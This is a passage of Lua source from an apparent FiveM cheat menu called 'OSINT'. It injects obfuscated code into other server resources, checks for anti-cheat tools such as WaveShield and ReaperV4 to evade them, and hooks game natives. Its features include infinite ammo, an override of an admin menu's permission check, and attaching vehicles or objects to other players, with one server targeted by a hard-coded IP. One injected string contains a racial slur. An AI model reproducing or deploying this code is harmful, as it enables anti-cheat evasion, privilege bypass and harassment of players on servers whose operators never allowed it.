                hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                RenderScriptCams(false, false, 0, true, true)
                if _G.OSINTFreecamObject then DestroyCam(_G.OSINTFreecamObject, false) _G.OSINTFreecamObject = nil end
                SetFocusEntity(PlayerPedId())
            else
                Injection(GetResourceState("monitor") == "started" and "monitor" or "any", [[
                    _G.OSINTFreecamEnabled = false
                    _G.OSINTFreecamThreadRunning = false

                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                    hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                    hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                    hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                    hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                    hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                    hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                    hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                    hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                    RenderScriptCams(false, false, 0, true, true)
                    if _G.OSINTFreecamObject then DestroyCam(_G.OSINTFreecamObject, false) _G.OSINTFreecamObject = nil end
                    SetFocusEntity(PlayerPedId())
                ]])
            end
        else
            _G.OSINTFreecamEnabled = false
            _G.OSINTFreecamThreadRunning = false

            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
            hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
            hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
            hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
            hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
            hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
            hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
            hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
            hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
            hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
            hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
            hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
            hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
            hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
            hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
            hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
            hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
            hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
            hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
            hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
            hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
            hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
            hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
            hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
            hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
            hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
            hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

            RenderScriptCams(false, false, 0, true, true)
            if _G.OSINTFreecamObject then DestroyCam(_G.OSINTFreecamObject, false) _G.OSINTFreecamObject = nil end
            SetFocusEntity(PlayerPedId())
        end
    end
end

function OSINT:EnableInfiniteAmmo()
if GetResourceState("WaveShield") == "started" then
    print('1')
        local function decode(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function g(n)
            return _G[decode(n)]
        end
        if not _G.osintInfAmmo then
            _G.osintInfAmmo = { enabled = false }
        end
        _G.osintInfAmmo.enabled = true
        local PlayerPedId_fn           = g({80,108,97,121,101,114,80,101,100,73,100})
        local GetSelectedPedWeapon_fn  = g({71,101,116,83,101,108,101,99,116,101,100,80,101,100,87,101,97,112,111,110})
        local GetHashKey_fn            = g({71,101,116,72,97,115,104,75,101,121})
        local GetAmmoInPedWeapon_fn    = g({71,101,116,65,109,109,111,73,110,80,101,100,87,101,97,112,111,110})
        local AddAmmoToPed_fn          = g({65,100,100,65,109,109,111,84,111,80,101,100})
        local DoesEntityExist_fn       = g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})
        local Wait_fn                  = g({87,97,105,116})

        local lastClip = {}   -- ped -> last known clip size

        local function initFlow(cb)
            local co = coroutine.create(cb)
            local function execCycle()
                while coroutine.status(co) ~= "dead" do
                    local ok, err = coroutine.resume(co)
                    if not ok then
                        print("^1[OSINT InfAmmo] Coroutine error: ^7", err)
                        break
                    end
                    Wait_fn(0)
                end
            end
            execCycle()
        end

        if not _G.osintWaveLoop then
            _G.osintWaveLoop = true
            initFlow(function()
                while _G.osintWaveLoop do
                    if _G.osintInfAmmo.enabled then
                        local ped = PlayerPedId_fn()
                        if DoesEntityExist_fn(ped) then
                            local weapon = GetSelectedPedWeapon_fn(ped)
                            if weapon and weapon ~= GetHashKey_fn("WEAPON_UNARMED") then
                                local _, clip = GetAmmoInPedWeapon_fn(ped, weapon)
                                local key = tostring(ped)

                                if not lastClip[key] then
                                    lastClip[key] = clip
                                end

                                if clip < lastClip[key] then
                                    AddAmmoToPed_fn(ped, weapon, lastClip[key] - clip)
                                end
                            end
                        end
                    else
                        coroutine.yield()
                    end
                    coroutine.yield()
                end
            end)
        end
    else
        if GetResourceState("ReaperV4") == 'started' then
            MachoInjectResourceRaw("any", [[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            local function _w(n)
                return Citizen.Wait(n)
            end
            if not _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = true
                local function ammoLoop()
                    if not _G.infiniteAmmoEnabled then return end
                    local ped = _g(_b("PlayerPedId"))()
                    if ped and _g(_b("DoesEntityExist"))(ped) then
                        local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                        if weapon and weapon ~= _g(_b("GetHashKey"))("WEAPON_UNARMED") then
                            _g(_b("SetPedInfiniteAmmo"))(ped, true, weapon)
                            _g(_b("SetPedInfiniteAmmoClip"))(ped, true)
                        end
                    end
                    Citizen.SetTimeout(100, ammoLoop)
                end
                ammoLoop()
            end
            ]])
        else
            Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            local function _w(n)
                return Citizen.Wait(n)
            end
            if not _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = true
                local function ammoLoop()
                    if not _G.infiniteAmmoEnabled then return end
                    local ped = _g(_b("PlayerPedId"))()
                    if ped and _g(_b("DoesEntityExist"))(ped) then
                        local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                        if weapon and weapon ~= _g(_b("GetHashKey"))("WEAPON_UNARMED") then
                            _g(_b("SetPedInfiniteAmmo"))(ped, true, weapon)
                            _g(_b("SetPedInfiniteAmmoClip"))(ped, true)
                        end
                    end
                    Citizen.SetTimeout(100, ammoLoop)
                end
                ammoLoop()
            end
            ]])
        end
    end
end

function OSINT:DisableInfiniteAmmo()
    if GetResourceState("WaveShield") == "started" then
        Injection(GetResourceState("WaveShield") == "started" and "WaveShield" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
            if _G.osintInfAmmo then
                _G.osintInfAmmo.enabled = false
            end
        ]])
    else
        if GetResourceState("ReaperV4") == 'started' then
            MachoInjectResourceRaw("any", [[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            if _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = false
                local ped = _g(_b("PlayerPedId"))()
                if ped and _g(_b("DoesEntityExist"))(ped) then
                    local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                    if weapon then
                        _g(_b("SetPedInfiniteAmmo"))(ped, false, weapon)
                        _g(_b("SetPedInfiniteAmmoClip"))(ped, false)
                    end
                end
            end
            ]])
        else
            Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            if _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = false
                local ped = _g(_b("PlayerPedId"))()
                if ped and _g(_b("DoesEntityExist"))(ped) then
                    local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                    if weapon then
                        _g(_b("SetPedInfiniteAmmo"))(ped, false, weapon)
                        _g(_b("SetPedInfiniteAmmoClip"))(ped, false)
                    end
                end
            end
            ]])
        end
    end
end

function OSINT:AttachSelectedVehicle(playerIds, vehicleModel)
    if not playerIds or #playerIds == 0 then 
        self:Notify("error", "OSINT", "No players selected!", 3000)
        return 
    end
    if not vehicleModel or #vehicleModel == 0 then 
        self:Notify("error", "OSINT", "Invalid vehicle model!", 3000)
        return 
    end

    local function encodeToByteArrayLiteral(str)
        local t = {}
        for i = 1, #str do t[i] = string.byte(str, i) end
        return table.concat(t, ",")
    end

    
    local model = vehicleModel
    local modelBytes = encodeToByteArrayLiteral(model)
    local serverEndpoint = GetCurrentServerEndpoint()
    local successCount = 0
    
    for _, playerId in ipairs(playerIds) do
        if GetResourceState("solos-rentals") == "started" then
            print("[vehicle_attach] Fallback: solos-rentals")
            local success, err = pcall(function()
                MachoInjectResource("solos-rentals", string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    config.locations["customnigga"] = {
                        vehiclespawncoords = vec4(coords.x, coords.y, coords.z, heading)
                    }
                    TriggerEvent("solos-rentals:client:SpawnVehicle", model, "customnigga", function(vehicle)
                        if vehicle and DoesEntityExist(vehicle) then
                            AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                            SetPedIntoVehicle(ped, vehicle, -1)
                        end
                    end)
                ]], modelBytes, playerId))
            end)
            if success then successCount = successCount + 1 end
            
        elseif GetResourceState("amigo") == "started" then
            print("[vehicle_attach] Fallback: Amigo RP")
            local success, err = pcall(function()
                MachoInjectResourceRaw("adminMenu", string.format([[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)

                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})

                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    local originalHasPerm = hasPerm
                    hasPerm = function(perm) return true end

                    local originalIsModelInCdimage = IsModelInCdimage
                    IsModelInCdimage = function(model) return true end

                    local veh = spawnVeh(model)
                    
                    hasPerm = originalHasPerm
                    IsModelInCdimage = originalIsModelInCdimage

                    Citizen.Wait(200)
                    if %s then
                        if veh and DoesEntityExist(veh) then
                            TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1) -- fixed: use PlayerPedId + TaskWarp
                        end
                    end
                ]], modelBytes, playerId))
            end)
            if success then successCount = successCount + 1 end
            
        elseif GetResourceState("qb-core") == "started" then
            print("[vehicle_attach] Fallback #02")
            local success, err = pcall(function()
                MachoInjectResource("qb-core", string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    QBCore.Functions.SpawnVehicle(model, function(vehicle)
                        if vehicle and DoesEntityExist(vehicle) then
                            AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                            SetPedIntoVehicle(ped, vehicle, -1)
                        end
                    end, coords, true, true)
                ]], modelBytes, playerId))
            end)
            if success then successCount = successCount + 1 end
            
        elseif serverEndpoint:match("([^:]+)") == "185.244.106.12" and GetResourceState("drc_gardener") == "started" then
            print("[vehicle_attach] Fallback #1")
            local success, err = pcall(function()
                MachoInjectResource("drc_gardener", string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    SpawnVehicleAndWarpPlayer(model, coords)
                ]], modelBytes, playerId))
            end)
            if success then successCount = successCount + 1 end
            
        elseif GetResourceState("lunar_bridge") == "started" then
            print("[vehicle_attach] Fallback #2")
            local success, err = pcall(function()
                MachoInjectResourceRaw("lunar_bridge", string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    Framework.spawnVehicle(model, coords, heading, function(vehicle)
                        if vehicle and DoesEntityExist(vehicle) then
                            SetVehicleOnGroundProperly(vehicle)
                            Citizen.Wait(500)
                            AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                            SetPedIntoVehicle(ped, vehicle, -1)
                        end
                    end)
                ]], modelBytes, playerId))
            end)
            if success then successCount = successCount + 1 end
            
        elseif GetResourceState("lation_laundering") == "started" then
            print("[vehicle_attach] Fallback #3")
            local success, err = pcall(function()
                MachoInjectResourceRaw("lation_laundering", string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    local position = vector4(coords.x, coords.y, coords.z + 0.5, heading)
                    local vehicle = SpawnVehicle(model, position)
                    if vehicle and DoesEntityExist(vehicle) then
                        SetVehicleOnGroundProperly(vehicle)
                        Citizen.Wait(500)
                        AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                        SetPedIntoVehicle(ped, vehicle, -1)
                        ShowNotification("~g~Vehicle attached successfully!")
                    end
                ]], modelBytes, playerId))
            end)
            if success then successCount = successCount + 1 end
        else
            print("[vehicle_attach] Universal Fallback")
            local success, err = pcall(function()
                local script = string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    RequestModel(model)
                    local maxAttempts = 20
                    local attempts = 0
                    while not HasModelLoaded(model) and attempts < maxAttempts do
                        Citizen.Wait(500)
                        attempts = attempts + 1
                    end
                    if attempts >= maxAttempts then return end
                    
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    local vehicle = CreateVehicle(model, coords.x, coords.y, coords.z, heading, true, true)
                    if vehicle and DoesEntityExist(vehicle) then
                        AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                        SetPedIntoVehicle(ped, vehicle, -1)
                        SetModelAsNoLongerNeeded(model)
                    end
                ]], modelBytes, playerId)
                MachoInjectResourceRaw("any", script, playerId)
            end)
            if success then successCount = successCount + 1 end
        end
    end
end


function encodeToByteArrayLiteral(str)
    if not str then return "" end
    if type(str) ~= "string" then
        return tostring(str)
    end
    if #str == 0 then return "" end
    local bytes = {}
    for i = 1, #str do
        bytes[#bytes + 1] = tostring(string.byte(str, i))
    end
    return table.concat(bytes, ", ")
end

function OSINT:SpawnSelectedObject(playerIds)
    if not playerIds or #playerIds == 0 then
        self:Notify("error", "OSINT", "No players selected!", 3000)
        return
    end
    local model = self:GetSelectedObjectModel()
    if not model or #model == 0 then
        self:Notify("error", "OSINT", "Invalid object model!", 3000)
        return
    end
    local modelBytes = encodeToByteArrayLiteral(model)
    local successCount = 0
    for _, playerId in ipairs(playerIds) do
        if GetResourceState("qb-core") == "started" or GetResourceState("mc9-core") == "started" and
        (GetResourceState("ElectronAC") == "started" or
            GetResourceState("FiniAC") == "started" or
            GetResourceState("ReaperV4") == "started" or
            GetResourceState("WaveShield") == "started") then
            self:Notify("error", "OSINT", "Using Qb-core Spawner!", 3000)
            MachoInjectResource("qb-core", string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})
                local hash = type(model) == 'string' and joaat(model) or model
                QBCore.Functions.LoadModel(hash)
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then return end
                local coords = GetEntityCoords(ped)
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                if obj and DoesEntityExist(obj) then
                    AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                    SetModelAsNoLongerNeeded(hash)
                end
            ]], modelBytes, playerId))
            successCount = successCount + 1
        elseif GetResourceState("cd_dispatch") == "started" then
            print("using fallback")
            -- Dedicated cd_dispatch branch: Hook CreateObject for hash override and model loading
            MachoInjectResource("cd_dispatch", string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})
                local hash = type(model) == 'string' and GetHashKey(model) or model
                
                -- Hook CreateObject to override hash and ensure model loading
                local originalCreateObject = CreateObject
                CreateObject = function(objHash, x, y, z, dynamic, placeOnGround, p7)
                    if type(objHash) == 'number' and objHash ~= hash then
                        -- Override with our custom hash for this spawn
                        objHash = hash
                    end
                    RequestModel(objHash)
                    while not HasModelLoaded(objHash) do
                        Citizen.Wait(0)
                    end
                    local obj = originalCreateObject(objHash, x, y, z, dynamic, placeOnGround, p7)
                    SetModelAsNoLongerNeeded(objHash)
                    return obj
                end
                
                -- Spawn the object on target player
                local player = GetPlayerFromServerId(%d)
                if player == -1 then 
                    CreateObject = originalCreateObject
                    return 
                end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then 
                    CreateObject = originalCreateObject
                    return 
                end
                local coords = GetEntityCoords(ped)
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                if obj and DoesEntityExist(obj) then
                    AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                end
                
                -- Restore original CreateObject
                CreateObject = originalCreateObject
            ]], modelBytes, playerId))
            successCount = successCount + 1
        elseif GetResourceState("rcore_drunk") == "started" then
            MachoInjectResourceRaw("rcore_drunk", string.format([[
                local model = "%s"
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then return end
                local coords = GetEntityCoords(ped)
                local hash = GetHashKey(model)
                RequestModel(hash)
                while not HasModelLoaded(hash) do Citizen.Wait(0) end
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
            ]], model, playerId))
            successCount = successCount + 1
        elseif GetResourceState("lc_fuel") == "started" then
            MachoInjectResourceRaw("lc_fuel", string.format([[
                local function spawnObj()
                    local model = "%s"
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    Config.NozzleProps.gas = model
                    local entity = createFuelNozzleObject()
                    SetEntityCoords(entity, coords)
                end
                spawnObj()
            ]], model, playerId))
            successCount = successCount + 1
        elseif GetResourceState("0r-illegalpack") == "started" then
            MachoInjectResourceRaw("0r-illegalpack", string.format([[
                local function spawnObj()
                    local model = "%s"
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    local entity = Utils.createObject(model, coords, vec3(0.0, 0.0, 0.0), true, true, false)
                end
                spawnObj()
            ]], model, playerId))
            successCount = successCount + 1
        elseif GetResourceState("xradio") == "started" then
            MachoInjectResourceRaw("xradio", string.format([[
                local function spawnObj()
                    local model = "%s"
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    CreateRadioObject(model, coords, function(entity)
                        print(entity)
                    end)
                end
                spawnObj()
            ]], model, playerId))
            successCount = successCount + 1
        else
            MachoInjectResourceRaw("any", string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})
                local hash = type(model) == 'string' and GetHashKey(model) or model
                RequestModel(hash)
                local attempts = 0
                while not HasModelLoaded(hash) and attempts < 20 do
                    Citizen.Wait(100)
                    attempts = attempts + 1
                end
                if attempts >= 20 then return end
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then return end
                local coords = GetEntityCoords(ped)
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                if obj and DoesEntityExist(obj) then
                    AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                    SetModelAsNoLongerNeeded(hash)
                end
            ]], modelBytes, playerId))
            successCount = successCount + 1
        end
    end
    self:Notify("success", "OSINT", string.format("Object '%s' spawned on %d/%d player(s)!", model, successCount, #playerIds), 5000)
end

function OSINT:HandleSpectateToggle(playerId, enabled)
    if not playerId then
        self:Notify("error", "OSINT", "Invalid player ID provided!", 3000)
        return
    end
    local targetServerId = tonumber(playerId)
    if not targetServerId then
        self:Notify("error", "OSINT", "Invalid server ID format!", 3000)
        return
    end
    if targetServerId == tonumber(GetPlayerServerId(PlayerId())) then
        self:Notify("error", "OSINT", "You cannot spectate yourself!", 3000)
        return
    end
